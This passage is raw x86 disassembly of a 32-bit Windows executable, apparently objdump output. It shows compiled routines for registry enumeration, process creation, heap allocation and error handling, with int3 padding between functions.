  4067c2:	jmp    0x406a02
  4067c7:	mov    ecx,DWORD PTR [esi]
  4067c9:	call   0x4061a9
  4067ce:	mov    eax,DWORD PTR [eax]
  4067d0:	mov    DWORD PTR [ebp-0x22c],eax
  4067d6:	test   eax,eax
  4067d8:	je     0x406a00
  4067de:	lea    eax,[ebp-0x22c]
  4067e4:	push   eax
  4067e5:	call   0x405ac9
  4067ea:	mov    esi,DWORD PTR [eax]
  4067ec:	cmp    DWORD PTR [esi+0x24],0x0
  4067f0:	je     0x4069f3
  4067f6:	xor    ecx,ecx
  4067f8:	mov    ebx,ecx
  4067fa:	mov    DWORD PTR [ebp-0x248],ebx
  406800:	mov    DWORD PTR [ebp-0x244],ecx
  406806:	mov    DWORD PTR [ebp-0x240],ecx
  40680c:	mov    DWORD PTR [ebp-0x4],ecx
  40680f:	mov    edi,ecx
  406811:	mov    DWORD PTR [ebp-0x23c],edi
  406817:	mov    DWORD PTR [ebp-0x238],ecx
  40681d:	mov    DWORD PTR [ebp-0x234],ecx
  406823:	lea    eax,[ebp-0x21c]
  406829:	mov    BYTE PTR [ebp-0x4],0x1
  40682d:	push   eax
  40682e:	mov    eax,DWORD PTR [ebp-0x24c]
  406834:	push   0x20019
  406839:	push   ecx
  40683a:	push   DWORD PTR [esi]
  40683c:	mov    DWORD PTR [ebp-0x21c],ecx
  406842:	push   DWORD PTR [eax]
  406844:	call   DWORD PTR ds:0x40a024
  40684a:	test   eax,eax
  40684c:	jne    0x4069c7
  406852:	mov    ebx,DWORD PTR [ebp-0x21c]
  406858:	lea    eax,[ebp-0x21c]
  40685e:	push   eax
  40685f:	mov    eax,DWORD PTR [ebp-0x250]
  406865:	push   ecx
  406866:	push   0x2001f
  40686b:	push   0x1
  40686d:	push   ecx
  40686e:	mov    DWORD PTR [ebp-0x248],ebx
  406874:	lea    ecx,[ebp-0x23c]
  40687a:	push   DWORD PTR [esi]
  40687c:	push   DWORD PTR [eax]
  40687e:	call   0x405df9
  406883:	mov    edi,DWORD PTR [ebp-0x23c]
  406889:	test   eax,eax
  40688b:	jne    0x4069c7
  406891:	xor    edx,edx
  406893:	mov    eax,edx
  406895:	mov    DWORD PTR [ebp-0x220],edx
  40689b:	mov    esi,edx
  40689d:	mov    DWORD PTR [ebp-0x21c],0x104
  4068a7:	mov    DWORD PTR [ebp-0x224],edx
  4068ad:	mov    DWORD PTR [ebp-0x228],esi
  4068b3:	lea    ecx,[ebp-0x224]
  4068b9:	mov    BYTE PTR [ebp-0x4],0x2
  4068bd:	push   ecx
  4068be:	push   edx
  4068bf:	lea    ecx,[ebp-0x230]
  4068c5:	push   ecx
  4068c6:	push   edx
  4068c7:	lea    ecx,[ebp-0x21c]
  4068cd:	push   ecx
  4068ce:	lea    ecx,[ebp-0x218]
  4068d4:	push   ecx
  4068d5:	push   eax
  4068d6:	push   ebx
  4068d7:	call   DWORD PTR ds:0x40a094
  4068dd:	test   eax,eax
  4068df:	je     0x4068e8
  4068e1:	cmp    eax,0xea
  4068e6:	jne    0x406954
  4068e8:	xor    eax,eax
  4068ea:	cmp    eax,eax
  4068ec:	ja     0x406a0c
  4068f2:	jb     0x406901
  4068f4:	cmp    DWORD PTR [ebp-0x224],0xffffffff
  4068fb:	ja     0x406a0c
  406901:	push   DWORD PTR [ebp-0x224]
  406907:	call   DWORD PTR ds:0x40a1e4
  40690d:	mov    esi,eax
  40690f:	mov    DWORD PTR [ebp-0x228],esi
  406915:	pop    ecx
  406916:	test   esi,esi
  406918:	je     0x406a0a
  40691e:	lea    eax,[ebp-0x224]
  406924:	mov    DWORD PTR [ebp-0x21c],0x104
  40692e:	push   eax
  40692f:	push   esi
  406930:	lea    eax,[ebp-0x230]
  406936:	push   eax
  406937:	push   0x0
  406939:	lea    eax,[ebp-0x21c]
  40693f:	push   eax
  406940:	lea    eax,[ebp-0x218]
  406946:	push   eax
  406947:	push   DWORD PTR [ebp-0x220]
  40694d:	push   ebx
  40694e:	call   DWORD PTR ds:0x40a094
  406954:	test   eax,eax
  406956:	jne    0x40697c
  406958:	push   DWORD PTR [ebp-0x224]
  40695e:	push   esi
  40695f:	push   DWORD PTR [ebp-0x230]
  406965:	push   eax
  406966:	lea    eax,[ebp-0x218]
  40696c:	push   eax
  40696d:	push   edi
  40696e:	call   DWORD PTR ds:0x40a10c
  406974:	mov    eax,DWORD PTR [ebp-0x220]
  40697a:	jmp    0x40698e
  40697c:	cmp    eax,0x103
  406981:	je     0x4069b4
  406983:	mov    eax,DWORD PTR [ebp-0x220]
  406989:	cmp    eax,0x64
  40698c:	ja     0x4069b4
  40698e:	inc    eax
  40698f:	mov    BYTE PTR [ebp-0x4],0x1
  406993:	push   esi
  406994:	mov    DWORD PTR [ebp-0x220],eax
  40699a:	call   DWORD PTR ds:0x40a1e8
  4069a0:	mov    eax,DWORD PTR [ebp-0x220]
  4069a6:	xor    edx,edx
  4069a8:	pop    ecx
  4069a9:	mov    DWORD PTR [ebp-0x228],edx
  4069af:	jmp    0x40689b
  4069b4:	push   esi
  4069b5:	mov    BYTE PTR [ebp-0x4],0x1
  4069b9:	call   DWORD PTR ds:0x40a1e8
  4069bf:	and    DWORD PTR [ebp-0x228],0x0
  4069c6:	pop    ecx
  4069c7:	mov    BYTE PTR [ebp-0x4],0x0
  4069cb:	test   edi,edi
  4069cd:	je     0x4069dd
  4069cf:	push   edi
  4069d0:	call   DWORD PTR ds:0x40a034
  4069d6:	and    DWORD PTR [ebp-0x23c],0x0
  4069dd:	or     DWORD PTR [ebp-0x4],0xffffffff
  4069e1:	test   ebx,ebx
  4069e3:	je     0x4069f3
  4069e5:	push   ebx
  4069e6:	call   DWORD PTR ds:0x40a034
  4069ec:	and    DWORD PTR [ebp-0x248],0x0
  4069f3:	cmp    DWORD PTR [ebp-0x22c],0x0
  4069fa:	jne    0x4067de
  406a00:	xor    eax,eax
  406a02:	call   0x407eb4
  406a07:	ret    0x8
  406a0a:	xor    eax,eax
  406a0c:	push   eax
  406a0d:	mov    BYTE PTR [ebp-0x4],0x1
  406a11:	call   DWORD PTR ds:0x40a1e8
  406a17:	xor    eax,eax
  406a19:	mov    DWORD PTR [ebp-0x228],eax
  406a1f:	mov    BYTE PTR [ebp-0x4],al
  406a22:	pop    ecx
  406a23:	test   edi,edi
  406a25:	je     0x406a35
  406a27:	push   edi
  406a28:	call   DWORD PTR ds:0x40a034
  406a2e:	and    DWORD PTR [ebp-0x23c],0x0
  406a35:	or     DWORD PTR [ebp-0x4],0xffffffff
  406a39:	test   ebx,ebx
  406a3b:	je     0x406a4b
  406a3d:	push   ebx
  406a3e:	call   DWORD PTR ds:0x40a034
  406a44:	and    DWORD PTR [ebp-0x248],0x0
  406a4b:	mov    eax,0x8007000e
  406a50:	jmp    0x406a02
  406a52:	int3   
  406a53:	int3   
  406a54:	int3   
  406a55:	int3   
  406a56:	int3   
  406a57:	push   0x5c
  406a59:	mov    eax,0x40860d
  406a5e:	call   0x407edc
  406a63:	xor    ebx,ebx
  406a65:	lea    edx,[ebp-0x14]
  406a68:	push   ebx
  406a69:	mov    ecx,0x4019f0
  406a6e:	call   0x40308c
  406a73:	test   eax,eax
  406a75:	je     0x406a95
  406a77:	mov    ecx,DWORD PTR [ebp-0x14]
  406a7a:	call   0x406f40
  406a7f:	push   DWORD PTR [ebp-0x14]
  406a82:	mov    esi,eax
  406a84:	call   DWORD PTR ds:0x40a05c
  406a8a:	test   esi,esi
  406a8c:	je     0x406a95
  406a8e:	xor    eax,eax
  406a90:	jmp    0x406be3
  406a95:	lea    eax,[ebp-0x14]
  406a98:	mov    DWORD PTR [ebp-0x14],ebx
  406a9b:	push   eax
  406a9c:	mov    ecx,0x409010
  406aa1:	call   0x405dc5
  406aa6:	test   eax,eax
  406aa8:	js     0x406bde
  406aae:	mov    eax,DWORD PTR [ebp-0x14]
  406ab1:	lea    edi,[eax+0x104]
  406ab7:	cmp    edi,eax
  406ab9:	jb     0x406bde
  406abf:	mov    DWORD PTR [ebp-0x14],ebx
  406ac2:	push   edi
  406ac3:	lea    ecx,[ebp-0x14]
  406ac6:	mov    DWORD PTR [ebp-0x4],ebx
  406ac9:	call   0x402acb
  406ace:	mov    esi,DWORD PTR [ebp-0x14]
  406ad1:	test   al,al
  406ad3:	jne    0x406adf
  406ad5:	mov    edi,0x8007000e
  406ada:	jmp    0x406bcb
  406adf:	push   edi
  406ae0:	push   esi
  406ae1:	push   0x409010
  406ae6:	call   DWORD PTR ds:0x40a064
  406aec:	test   eax,eax
  406aee:	jne    0x406b0e
  406af0:	call   DWORD PTR ds:0x40a114
  406af6:	mov    edi,eax
  406af8:	test   edi,edi
  406afa:	jle    0x406bcb
  406b00:	movzx  edi,di
  406b03:	or     edi,0x80070000
  406b09:	jmp    0x406bcb
  406b0e:	cmp    eax,edi
  406b10:	jbe    0x406b1c
  406b12:	mov    edi,0x8007007a
  406b17:	jmp    0x406bcb
  406b1c:	lea    ebx,[edi+0x104]
  406b22:	cmp    ebx,edi
  406b24:	jb     0x406bc4
  406b2a:	and    DWORD PTR [ebp-0x10],0x0
  406b2e:	push   ebx
  406b2f:	lea    ecx,[ebp-0x10]
  406b32:	mov    BYTE PTR [ebp-0x4],0x1
  406b36:	call   0x402acb
  406b3b:	test   al,al
  406b3d:	jne    0x406b46
  406b3f:	mov    edi,0x8007000e
  406b44:	jmp    0x406b61
  406b46:	push   esi
  406b47:	push   0x401a0c
  406b4c:	push   ebx
  406b4d:	push   DWORD PTR [ebp-0x10]
  406b50:	call   0x405d14
  406b55:	add    esp,0x10
  406b58:	test   eax,eax
  406b5a:	jns    0x406b65
  406b5c:	mov    edi,0x80004005
  406b61:	xor    ebx,ebx
  406b63:	jmp    0x406bb2
  406b65:	push   0x44
  406b67:	pop    edi
  406b68:	push   edi
  406b69:	xor    ebx,ebx
  406b6b:	lea    eax,[ebp-0x68]
  406b6e:	push   ebx
  406b6f:	push   eax
  406b70:	call   0x407e84
  406b75:	add    esp,0xc
  406b78:	mov    DWORD PTR [ebp-0x68],edi
  406b7b:	lea    eax,[ebp-0x24]
  406b7e:	push   eax
  406b7f:	lea    eax,[ebp-0x68]
  406b82:	push   eax
  406b83:	push   ebx
  406b84:	push   ebx
  406b85:	push   ebx
  406b86:	push   ebx
  406b87:	push   ebx
  406b88:	push   ebx
  406b89:	push   DWORD PTR [ebp-0x10]
  406b8c:	push   esi
  406b8d:	call   DWORD PTR ds:0x40a0c4
  406b93:	test   eax,eax
  406b95:	jne    0x406b9e
  406b97:	mov    edi,0x80004005
  406b9c:	jmp    0x406bb2
  406b9e:	push   DWORD PTR [ebp-0x24]
  406ba1:	call   DWORD PTR ds:0x40a05c
  406ba7:	push   DWORD PTR [ebp-0x20]
  406baa:	call   DWORD PTR ds:0x40a05c
  406bb0:	mov    edi,ebx
  406bb2:	mov    BYTE PTR [ebp-0x4],bl
  406bb5:	push   DWORD PTR [ebp-0x10]
  406bb8:	call   DWORD PTR ds:0x40a1e8
  406bbe:	pop    ecx
  406bbf:	mov    DWORD PTR [ebp-0x10],ebx
  406bc2:	jmp    0x406bcb
  406bc4:	mov    edi,0x80004005
  406bc9:	xor    ebx,ebx
  406bcb:	or     DWORD PTR [ebp-0x4],0xffffffff
  406bcf:	push   esi
  406bd0:	call   DWORD PTR ds:0x40a1e8
  406bd6:	pop    ecx
  406bd7:	mov    DWORD PTR [ebp-0x14],ebx
  406bda:	mov    eax,edi
  406bdc:	jmp    0x406be3
  406bde:	mov    eax,0x80004005
  406be3:	call   0x407e9b
  406be8:	ret    
  406be9:	int3   
  406bea:	int3   
  406beb:	int3   
  406bec:	int3   
  406bed:	int3   
  406bee:	mov    edi,edi
  406bf0:	push   ebp
  406bf1:	mov    ebp,esp
  406bf3:	sub    esp,0x44
  406bf6:	mov    eax,ds:0x409004
  406bfb:	xor    eax,ebp
  406bfd:	mov    DWORD PTR [ebp-0x4],eax
  406c00:	push   ebx
  406c01:	mov    ebx,DWORD PTR [ebp+0x8]
  406c04:	push   esi
  406c05:	push   edi
  406c06:	mov    edi,DWORD PTR [ebp+0xc]
  406c09:	mov    esi,edx
  406c0b:	neg    edi
  406c0d:	sbb    edi,edi
  406c0f:	and    edi,0x3
  406c12:	call   0x406d55
  406c17:	test   eax,eax
  406c19:	jne    0x406c25
  406c1b:	mov    eax,0x80070057
  406c20:	jmp    0x406d08
  406c25:	imul   esi,esi,0x18
  406c28:	mov    ecx,0x401b90
  406c2d:	add    esi,0x4091b0
  406c33:	mov    eax,DWORD PTR [esi]
  406c35:	mov    dx,WORD PTR [eax]
  406c38:	cmp    dx,WORD PTR [ecx]
  406c3b:	jne    0x406c5b
  406c3d:	test   dx,dx
  406c40:	je     0x406c57
  406c42:	mov    dx,WORD PTR [eax+0x2]
  406c46:	cmp    dx,WORD PTR [ecx+0x2]
  406c4a:	jne    0x406c5b
  406c4c:	add    eax,0x4
  406c4f:	add    ecx,0x4
  406c52:	test   dx,dx
  406c55:	jne    0x406c35
  406c57:	xor    eax,eax
  406c59:	jmp    0x406c60
  406c5b:	sbb    eax,eax
  406c5d:	or     eax,0x1
  406c60:	test   eax,eax
  406c62:	jne    0x406c73
  406c64:	mov    ecx,DWORD PTR [ebx]
  406c66:	call   0x406d98
  406c6b:	test   eax,eax
  406c6d:	js     0x406d08
  406c73:	mov    eax,DWORD PTR [esi+0xc]
  406c76:	sub    eax,0x0
  406c79:	je     0x406d29
  406c7f:	sub    eax,0x1
  406c82:	je     0x406d21
  406c88:	sub    eax,0x1
  406c8b:	jne    0x406d06
  406c8d:	mov    eax,DWORD PTR [esi+0x10]
  406c90:	test   ebx,ebx
  406c92:	jne    0x406d1b
  406c98:	push   ebx
  406c99:	lea    ecx,[ebp-0x40]
  406c9c:	mov    DWORD PTR [ebp-0x40],eax
  406c9f:	push   ecx
  406ca0:	push   eax
  406ca1:	push   DWORD PTR [esi+0x4]
  406ca4:	call   DWORD PTR ds:0x40a154
  406caa:	test   eax,eax
  406cac:	je     0x406d3c
  406cb2:	mov    eax,DWORD PTR [ebp-0x3c]
  406cb5:	test   al,0x1
  406cb7:	jne    0x406d06
  406cb9:	or     eax,0x1
  406cbc:	cmp    DWORD PTR [esi+0x8],0x43
  406cc0:	mov    DWORD PTR [ebp-0x3c],eax
  406cc3:	jne    0x406cd5
  406cc5:	call   0x40221e
  406cca:	test   al,al
  406ccc:	je     0x406cd5
  406cce:	or     DWORD PTR [ebp-0x3c],0x1000
  406cd5:	push   edi
  406cd6:	lea    eax,[ebp-0x40]
  406cd9:	push   eax
  406cda:	push   DWORD PTR [esi+0x10]
  406cdd:	push   DWORD PTR [esi+0x8]
  406ce0:	call   DWORD PTR ds:0x40a154
  406ce6:	test   edi,edi
  406ce8:	jne    0x406d06
  406cea:	lea    eax,[ebp-0x44]
  406ced:	push   eax
  406cee:	push   0x1388
  406cf3:	push   0x2
  406cf5:	push   edi
  406cf6:	push   DWORD PTR [esi+0x8]
  406cf9:	push   0x1a
  406cfb:	push   0xffff
  406d00:	call   DWORD PTR ds:0x40a13c
  406d06:	xor    eax,eax
  406d08:	mov    ecx,DWORD PTR [ebp-0x4]
  406d0b:	pop    edi
  406d0c:	pop    esi
  406d0d:	xor    ecx,ebp
  406d0f:	pop    ebx
  406d10:	call   0x407750
  406d15:	mov    esp,ebp
  406d17:	pop    ebp
  406d18:	ret    0x8
  406d1b:	push   edi
  406d1c:	mov    DWORD PTR [ebx],eax
  406d1e:	push   ebx
  406d1f:	jmp    0x406d24
  406d21:	push   edi
  406d22:	push   DWORD PTR [ebx]
  406d24:	push   DWORD PTR [esi+0x10]
  406d27:	jmp    0x406d2f
  406d29:	push   edi
  406d2a:	push   DWORD PTR [esi+0x14]
  406d2d:	push   DWORD PTR [ebx]
  406d2f:	push   DWORD PTR [esi+0x8]
  406d32:	call   DWORD PTR ds:0x40a154
  406d38:	test   eax,eax
  406d3a:	jne    0x406d06
  406d3c:	call   DWORD PTR ds:0x40a114
  406d42:	test   eax,eax
  406d44:	jle    0x406d08
  406d46:	movzx  eax,ax
  406d49:	or     eax,0x80070000
  406d4e:	jmp    0x406d08
  406d50:	int3   
  406d51:	int3   
  406d52:	int3   
  406d53:	int3   
  406d54:	int3   
  406d55:	mov    ecx,DWORD PTR [ecx]
  406d57:	imul   eax,edx,0x18
  406d5a:	mov    eax,DWORD PTR [eax+0x4091b0]
  406d60:	mov    dx,WORD PTR [eax]
  406d63:	cmp    dx,WORD PTR [ecx]
  406d66:	jne    0x406d86
  406d68:	test   dx,dx
  406d6b:	je     0x406d82
  406d6d:	mov    dx,WORD PTR [eax+0x2]
  406d71:	cmp    dx,WORD PTR [ecx+0x2]
  406d75:	jne    0x406d86
  406d77:	add    eax,0x4
  406d7a:	add    ecx,0x4
  406d7d:	test   dx,dx
  406d80:	jne    0x406d60
  406d82:	xor    ecx,ecx
  406d84:	jmp    0x406d8b
  406d86:	sbb    ecx,ecx
  406d88:	or     ecx,0x1
  406d8b:	xor    eax,eax
  406d8d:	test   ecx,ecx
  406d8f:	sete   al
  406d92:	ret    
  406d93:	int3   
  406d94:	int3   
  406d95:	int3   
  406d96:	int3   
  406d97:	int3   
  406d98:	mov    edi,edi
  406d9a:	push   ebp
  406d9b:	mov    ebp,esp
  406d9d:	sub    esp,0x20
  406da0:	mov    eax,ds:0x409004
  406da5:	xor    eax,ebp
  406da7:	mov    DWORD PTR [ebp-0x4],eax
  406daa:	push   esi
  406dab:	push   edi
  406dac:	mov    edi,ecx
  406dae:	mov    DWORD PTR [ebp-0x18],0x1003
  406db5:	mov    DWORD PTR [ebp-0x14],0x1005
  406dbc:	xor    esi,esi
  406dbe:	mov    DWORD PTR [ebp-0x10],0x1007
  406dc5:	mov    DWORD PTR [ebp-0xc],0x1015
  406dcc:	mov    DWORD PTR [ebp-0x8],0x1017
  406dd3:	push   0x3
  406dd5:	push   edi
  406dd6:	push   0x0
  406dd8:	push   DWORD PTR [ebp+esi*4-0x18]
  406ddc:	call   DWORD PTR ds:0x40a154
  406de2:	test   eax,eax
  406de4:	je     0x406e0e
  406de6:	inc    esi
  406de7:	cmp    esi,0x5
  406dea:	jb     0x406dd3
  406dec:	push   0x3
  406dee:	lea    eax,[ebp-0x20]
  406df1:	mov    DWORD PTR [ebp-0x20],0x8
  406df8:	push   eax
  406df9:	push   0x0
  406dfb:	push   0x49
  406dfd:	mov    DWORD PTR [ebp-0x1c],edi
  406e00:	call   DWORD PTR ds:0x40a154
  406e06:	test   eax,eax
  406e08:	je     0x406e0e
  406e0a:	xor    eax,eax
  406e0c:	jmp    0x406e20
  406e0e:	call   DWORD PTR ds:0x40a114
  406e14:	test   eax,eax
  406e16:	jle    0x406e20
  406e18:	movzx  eax,ax
  406e1b:	or     eax,0x80070000
  406e20:	mov    ecx,DWORD PTR [ebp-0x4]
  406e23:	pop    edi
  406e24:	xor    ecx,ebp
  406e26:	pop    esi
  406e27:	call   0x407750
  406e2c:	mov    esp,ebp
  406e2e:	pop    ebp
  406e2f:	ret    
  406e30:	int3   
  406e31:	int3   
  406e32:	int3   
  406e33:	int3   
  406e34:	int3   
  406e35:	mov    edi,edi
  406e37:	push   ebp
  406e38:	mov    ebp,esp
  406e3a:	mov    ecx,DWORD PTR [ebp+0x10]
  406e3d:	push   esi
  406e3e:	push   edi
  406e3f:	xor    edi,edi
  406e41:	test   ecx,ecx
  406e43:	je     0x406e6b
  406e45:	cmp    WORD PTR [ecx],di
  406e48:	jne    0x406e4e
  406e4a:	push   0xe
  406e4c:	jmp    0x406e6d
  406e4e:	mov    edx,ecx
  406e50:	lea    esi,[edx+0x2]
  406e53:	mov    ax,WORD PTR [edx]
  406e56:	add    edx,0x2
  406e59:	cmp    ax,di
  406e5c:	jne    0x406e53
  406e5e:	sub    edx,esi
  406e60:	sar    edx,1
  406e62:	lea    edx,[edx*2+0x2]
  406e69:	jmp    0x406e6e
  406e6b:	push   0xa
  406e6d:	pop    edx
  406e6e:	test   ecx,ecx
  406e70:	je     0x406e7e
  406e72:	cmp    WORD PTR [ecx],di
  406e75:	jne    0x406e83
  406e77:	mov    ecx,0x4015c8
  406e7c:	jmp    0x406e83
  406e7e:	mov    ecx,0x4015d8
  406e83:	push   edi
  406e84:	push   0x4
  406e86:	lea    eax,[ebp+0x14]
  406e89:	push   eax
  406e8a:	push   edx
  406e8b:	push   ecx
  406e8c:	push   0xb
  406e8e:	push   0x401294
  406e93:	push   0x2b
  406e95:	push   DWORD PTR [ebp+0xc]
  406e98:	push   DWORD PTR [ebp+0x8]
  406e9b:	call   DWORD PTR ds:0x40a03c
  406ea1:	add    esp,0x28
  406ea4:	pop    edi
  406ea5:	pop    esi
  406ea6:	pop    ebp
  406ea7:	ret    0x10
  406eaa:	int3   
  406eab:	int3   
  406eac:	int3   
  406ead:	int3   
  406eae:	int3   
  406eaf:	mov    eax,ds:0x40900c
  406eb4:	push   esi
  406eb5:	mov    esi,ecx
  406eb7:	test   BYTE PTR [eax+0x1c],0x40
  406ebb:	je     0x406ed3
  406ebd:	push   DWORD PTR [esi+0x4]
  406ec0:	mov    edx,0x401294
  406ec5:	push   DWORD PTR [eax+0x14]
  406ec8:	push   DWORD PTR [eax+0x10]
  406ecb:	push   0xa
  406ecd:	pop    ecx
  406ece:	call   0x403882
  406ed3:	mov    eax,esi
  406ed5:	pop    esi
  406ed6:	ret    
  406ed7:	int3   
  406ed8:	int3   
  406ed9:	int3   
  406eda:	int3   
  406edb:	int3   
  406edc:	mov    edi,edi
  406ede:	push   ecx
  406edf:	push   esi
  406ee0:	mov    esi,ecx
  406ee2:	push   edi
  406ee3:	mov    edi,0x40900c
  406ee8:	mov    eax,DWORD PTR [esi]
  406eea:	test   eax,eax
  406eec:	je     0x406f12
  406eee:	mov    ecx,DWORD PTR [eax]
  406ef0:	test   ecx,ecx
  406ef2:	jns    0x406f12
  406ef4:	mov    eax,ds:0x40900c
  406ef9:	cmp    eax,edi
  406efb:	je     0x406f37
  406efd:	test   BYTE PTR [eax+0x1c],0x4
  406f01:	je     0x406f17
  406f03:	push   ecx
  406f04:	push   DWORD PTR [esi+0x4]
  406f07:	push   DWORD PTR [eax+0x14]
  406f0a:	push   DWORD PTR [eax+0x10]
  406f0d:	call   0x406e35
  406f12:	mov    eax,ds:0x40900c
  406f17:	cmp    eax,edi
  406f19:	je     0x406f37
  406f1b:	test   BYTE PTR [eax+0x1c],0x40
  406f1f:	je     0x406f37
  406f21:	push   DWORD PTR [esi+0x4]
  406f24:	mov    edx,0x401294
  406f29:	push   DWORD PTR [eax+0x14]
  406f2c:	push   DWORD PTR [eax+0x10]
  406f2f:	push   0xc
  406f31:	pop    ecx
  406f32:	call   0x403882
  406f37:	pop    edi
  406f38:	pop    esi
  406f39:	pop    ecx
  406f3a:	ret    
  406f3b:	int3   
  406f3c:	int3   
  406f3d:	int3   
  406f3e:	int3   
  406f3f:	int3   
  406f40:	mov    edi,edi
  406f42:	push   ebp
  406f43:	mov    ebp,esp
  406f45:	push   ecx
  406f46:	push   ecx
  406f47:	push   ebx
  406f48:	push   esi
  406f49:	push   edi
  406f4a:	xor    esi,esi
  406f4c:	mov    edi,ecx
  406f4e:	push   0x401cb8
  406f53:	push   esi
  406f54:	push   0x4
  406f56:	mov    DWORD PTR [ebp-0x8],esi
  406f59:	mov    ebx,esi
  406f5b:	call   DWORD PTR ds:0x40a08c
  406f61:	mov    DWORD PTR [ebp-0x4],eax
  406f64:	test   eax,eax
  406f66:	je     0x406f8e
  406f68:	test   edi,edi
  406f6a:	jne    0x406f77
  406f6c:	call   DWORD PTR ds:0x40a0d4
  406f72:	mov    edi,eax
  406f74:	mov    eax,DWORD PTR [ebp-0x4]
  406f77:	lea    ecx,[ebp-0x8]
  406f7a:	push   ecx
  406f7b:	push   eax
  406f7c:	push   edi
  406f7d:	call   DWORD PTR ds:0x40a090
  406f83:	push   DWORD PTR [ebp-0x4]
  406f86:	mov    ebx,eax
  406f88:	call   DWORD PTR ds:0x40a05c
  406f8e:	cmp    DWORD PTR [ebp-0x8],esi
  406f91:	je     0x406f9a
  406f93:	test   ebx,ebx
  406f95:	je     0x406f9a
  406f97:	xor    esi,esi
  406f99:	inc    esi
  406f9a:	pop    edi
  406f9b:	mov    eax,esi
  406f9d:	pop    esi
  406f9e:	pop    ebx
  406f9f:	mov    esp,ebp
  406fa1:	pop    ebp
  406fa2:	ret    
  406fa3:	int3   
  406fa4:	int3   
  406fa5:	int3   
  406fa6:	int3   
  406fa7:	int3   
  406fa8:	int3   
  406fa9:	int3   
  406faa:	int3   
  406fab:	int3   
  406fac:	int3   
  406fad:	int3   
  406fae:	int3   
  406faf:	int3   
  406fb0:	mov    edi,edi
  406fb2:	push   ebp
  406fb3:	mov    ebp,esp
  406fb5:	mov    edx,DWORD PTR [ebp+0x8]
  406fb8:	push   esi
  406fb9:	push   edi
  406fba:	mov    edi,ecx
  406fbc:	test   edx,edx
  406fbe:	js     0x40701b
  406fc0:	mov    eax,0x7fffffff
  406fc5:	sub    eax,edx
  406fc7:	cmp    eax,0x1
  406fca:	jl     0x40701b
  406fcc:	inc    edx
  406fcd:	lea    esi,[edx+0x7]
  406fd0:	and    esi,0xfffffff8
  406fd3:	cmp    edx,esi
  406fd5:	jg     0x40701b
  406fd7:	mov    eax,esi
  406fd9:	mul    DWORD PTR [ebp+0xc]
  406fdc:	test   edx,edx
  406fde:	ja     0x40701b
  406fe0:	jb     0x406fe7
  406fe2:	cmp    eax,0xffffffff
  406fe5:	ja     0x40701b
  406fe7:	cmp    eax,0xffffffef
  406fea:	ja     0x40701b
  406fec:	mov    ecx,DWORD PTR [edi+0x4]
  406fef:	add    eax,0x10
  406ff2:	push   eax
  406ff3:	push   0x0
  406ff5:	push   DWORD PTR [ecx+0x4]
  406ff8:	call   DWORD PTR ds:0x40a11c
  406ffe:	mov    ecx,eax
  407000:	test   ecx,ecx
  407002:	je     0x40701b
  407004:	and    DWORD PTR [ecx+0x4],0x0
  407008:	lea    eax,[esi-0x1]
  40700b:	mov    DWORD PTR [ecx+0x8],eax
  40700e:	mov    eax,ecx
  407010:	mov    DWORD PTR [ecx],edi
  407012:	mov    DWORD PTR [ecx+0xc],0x1
  407019:	jmp    0x40701d
  40701b:	xor    eax,eax
  40701d:	pop    edi
  40701e:	pop    esi
  40701f:	pop    ebp
  407020:	ret    0x8
  407023:	int3   
  407024:	int3   
  407025:	int3   
  407026:	int3   
  407027:	int3   
  407028:	int3   
  407029:	int3   
  40702a:	int3   
  40702b:	int3   
  40702c:	int3   
  40702d:	int3   
  40702e:	int3   
  40702f:	int3   
  407030:	mov    edi,edi
  407032:	push   ebp
  407033:	mov    ebp,esp
  407035:	cmp    DWORD PTR [ebp+0x8],0x0
  407039:	je     0x40704c
  40703b:	push   DWORD PTR [ebp+0x8]
  40703e:	mov    eax,DWORD PTR [ecx+0x4]
  407041:	push   0x0
  407043:	push   DWORD PTR [eax+0x4]
  407046:	call   DWORD PTR ds:0x40a0bc
  40704c:	pop    ebp
  40704d:	ret    0x4
  407050:	int3   
  407051:	int3   
  407052:	int3   
  407053:	int3   
  407054:	int3   
  407055:	int3   
  407056:	int3   
  407057:	int3   
  407058:	int3   
  407059:	int3   
  40705a:	int3   
  40705b:	int3   
  40705c:	int3   
  40705d:	int3   
  40705e:	int3   
  40705f:	int3   
  407060:	mov    edi,edi
  407062:	push   ebp
  407063:	mov    ebp,esp
  407065:	mov    edx,DWORD PTR [ebp+0xc]
  407068:	push   esi
  407069:	test   edx,edx
  40706b:	js     0x4070b8
  40706d:	mov    eax,0x7fffffff
  407072:	sub    eax,edx
  407074:	cmp    eax,0x1
  407077:	jl     0x4070b8
  407079:	inc    edx
  40707a:	lea    esi,[edx+0x7]
  40707d:	and    esi,0xfffffff8
  407080:	cmp    edx,esi
  407082:	jg     0x4070b8
  407084:	mov    eax,esi
  407086:	mul    DWORD PTR [ebp+0x10]
  407089:	test   edx,edx
  40708b:	ja     0x4070b8
  40708d:	jb     0x407094
  40708f:	cmp    eax,0xffffffff
  407092:	ja     0x4070b8
  407094:	cmp    eax,0xffffffef
  407097:	ja     0x4070b8
  407099:	mov    ecx,DWORD PTR [ecx+0x4]
  40709c:	add    eax,0x10
  40709f:	push   eax
  4070a0:	push   DWORD PTR [ebp+0x8]
  4070a3:	call   0x407190
  4070a8:	mov    ecx,eax
  4070aa:	test   ecx,ecx
  4070ac:	je     0x4070b8
  4070ae:	lea    eax,[esi-0x1]
  4070b1:	mov    DWORD PTR [ecx+0x8],eax
  4070b4:	mov    eax,ecx
  4070b6:	jmp    0x4070ba
  4070b8:	xor    eax,eax
  4070ba:	pop    esi
  4070bb:	pop    ebp
  4070bc:	ret    0xc
  4070bf:	int3   
  4070c0:	int3   
  4070c1:	int3   
  4070c2:	int3   
  4070c3:	int3   
  4070c4:	int3   
  4070c5:	int3   
  4070c6:	int3   
  4070c7:	int3   
  4070c8:	int3   
  4070c9:	int3   
  4070ca:	int3   
  4070cb:	int3   
  4070cc:	int3   
  4070cd:	int3   
  4070ce:	int3   
  4070cf:	int3   
  4070d0:	mov    edi,edi
  4070d2:	lock inc DWORD PTR [ecx+0x14]
  4070d6:	lea    eax,[ecx+0x8]
  4070d9:	ret    
  4070da:	int3   
  4070db:	int3   
  4070dc:	int3   
  4070dd:	int3   
  4070de:	int3   
  4070df:	int3   
  4070e0:	mov    eax,ecx
  4070e2:	ret    
  4070e3:	int3   
  4070e4:	int3   
  4070e5:	int3   
  4070e6:	int3   
  4070e7:	int3   
  4070e8:	int3   
  4070e9:	int3   
  4070ea:	int3   
  4070eb:	int3   
  4070ec:	int3   
  4070ed:	int3   
  4070ee:	int3   
  4070ef:	int3   
  4070f0:	mov    edi,edi
  4070f2:	push   ebp
